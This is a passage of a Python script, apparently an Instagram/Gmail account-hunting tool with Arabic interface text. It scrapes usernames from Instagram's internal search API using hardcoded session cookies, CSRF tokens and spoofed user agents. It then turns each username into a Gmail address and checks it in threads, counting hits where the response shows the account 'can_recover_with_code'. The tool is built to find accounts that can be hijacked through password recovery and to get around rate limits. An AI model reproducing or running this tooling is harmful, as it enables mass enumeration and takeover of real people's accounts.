    except Exception as e:""
   # print(e)
    if ('"can_recover_with_code"')in res:
        hso_gmail(email)
        GI+=1
        print(logo)
        sys.stdout.write(f"""{C}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§{Y}
⠀                                ⠀⠀⠀⠀@llkbvm


        ██╗           ██████╗       █████╗      ██╗
        ██║          ██╔═══██╗     ██╔══██╗     ██║
        ██║          ██║   ██║     ███████║     ██║
        ██║          ██║   ██║     ██╔══██║     ██║
        ███████╗     ╚██████╔╝     ██║  ██║  ██║
        ╚══════╝      ╚═════╝      ╚═╝  ╚═╝     ╚═╝


          
{C}§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§{M}

\r         {S}يصيد [ {F}صح : {M}{GE}{Z} | غلط: {M}{BE}{X} | لا: {M}{BI}{C}{S} ]
"""),sys.stdout.flush()
    elif ('"spam":true')in res:
       os.system('cls'if os.name=='nt'else'clear')
       print("شغل VPN : ")
    else:
        BI+=1
        print(logo)
        sys.stdout.write(f"""{C}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§{Y}
⠀⠀                                     ⠀⠀@llkbvm


        ██╗           ██████╗       █████╗      ██╗
        ██║          ██╔═══██╗     ██╔══██╗     ██║
        ██║          ██║   ██║     ███████║     ██║
        ██║          ██║   ██║     ██╔══██║     ██║
        ███████╗     ╚██████╔╝     ██║  ██║     ██║
        ╚══════╝      ╚═════╝      ╚═╝  ╚═╝     ╚═╝


 
{C}§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§{M}

\r         {S}يصيد - [ {F}صح : {M}{GE}{Z} | غلط: {M}{BE}{X} | لا: {M}{BI}{C}{S} ]
"""),sys.stdout.flush()
def ra():
    while True:
        g=random.choice(
            [
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç', 
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',

'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',                'abcdefghijklmnopqrstuvwxyzñ',
                'abcdefghijklmnopqrstuvwxyzñ',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到 说时国和地要就出会可也你对生能而子那得于着下自之',
                '的一是不了人我在有他这为之大来以个中上们到 说时国和地要就出会可也你对生能而子那得于着下自之',
                '的一是不了人我在有他这为之大来以个中上们到 说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナ ニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'アイウエオカキクケコサシスセソタチツテトナ ニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとな にぬねのはひふへほまみむめもやゆよらりるれろわをん',
                'あいうえおかきくけこさしすせそたちつてとな にぬねのはひふへほまみむめもやゆよらりるれろわをん',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'αβγδεζηθικλμνξοπρστυφχψω',
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç',
                'abcdefghijklmnopqrstuvwxyzç',
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
            ]

        )
        keyword=''.join((random.choice(g) for i in range(random.randrange(4,9))))
        cookies = {
            'rur': '"LDC\\05467838469205\\0541758153066:01f72be7578ed09a57bfe3e41c19af58848e0e965e0549f6d1f5a0168a652d2bfa28cd9a"',
        }

        headers = {
            'accept': '*/*',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'priority': 'u=1, i',
            'referer': 'https://www.instagram.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-full-version-list': '"Chromium";v="128.0.6613.138", "Not;A=Brand";v="24.0.0.0", "Google Chrome";v="128.0.6613.138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()),
            'x-asbd-id': '129477',
            'x-bloks-version-id': '235c9483d007713b45fc75b34c76332d68d579a4300a1db1da94670c3a05089f',
            'x-csrftoken': 'mf3zd6qWxnKgh9BaNRI5Ldpms2NrH62X',
            'x-fb-friendly-name': 'PolarisSearchBoxRefetchableQuery',
            'x-fb-lsd': 'BslibIYRWxn19hyIaPyrZV',
            'x-ig-app-id': '936619743392459',
        }

        data = {
            'variables': '{"data":{"context":"blended","include_reel":"true","query":"'+keyword+'","rank_token":"","search_surface":"web_top_search"},"hasQuery":true}',
            'doc_id': '7935512656557707',
        }
        try:
            res = requests.post('https://www.instagram.com/graphql/query', cookies=cookies, headers=headers, data=data).json()
            HSO=res['data']['xdt_api__v1__fbsearch__topsearch_connection']['users']
            for hsh in HSO:
                uss=hsh['user']['username']
                email=uss+'@gmail.com'
                HSO_to_examine(email)
        except Exception as e :
            pass
def admin_gmail(name):
    try:
         file = open(name,'r').read().splitlines()
    except:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(Z+"File Not Fund")
    with ThreadPoolExecutor(max_workers=10)as executor:
        futures=[executor.submit(HSO_to_examine,user+"@gmail.com")for user in file]
        for future in futures:
            future.result()

def main():
     try:
        print(logo)
        hmhm = (f'''
 {W9}— — — — — — — — — — — — —        
 {W6}﴾ 1 - Random Gmail ﴿        

 {W3}﴾ 2 - List Gmail ﴿        
 {W9}— — — — — — — — — — — — —
''')
        print(hmhm)
        ii=int(input(f"{W9} [{W8}●{W9}] {W5}Choose : {W8}"))
        if ii==1:         
               os.system("cls"if os.name=="nt"else"clear")
               for i in range(5):
                    threading.Thread(target=ra).start()	          
        elif ii==2:
               os.system("cls"if os.name=="nt"else"clear")
               name=input(F"Enter File Name : "+M)
               admin_gmail(name)
        else:print("Errur Input : ")
     except:print(M+"Errur Code : 5101")	
main()